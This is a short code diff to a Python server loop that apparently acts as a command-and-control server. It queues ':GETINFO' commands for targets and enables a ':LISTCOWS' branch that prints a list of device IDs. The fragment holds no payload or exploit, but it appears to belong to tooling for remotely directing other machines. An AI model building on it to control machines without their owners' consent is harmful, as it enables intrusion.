@@ -46,6 +46,8 @@ while True:
         pending_command[target] = ":COMMAND :GETINFO"
         print(f"[+] Queued :GETINFO for {target}")
 
-    #elif msg.startswith(":LISTCOWS"):
+    elif msg.startswith(":LISTCOWS"):
+        print(DeviceIDList)
+        
 
     client_socket.close()
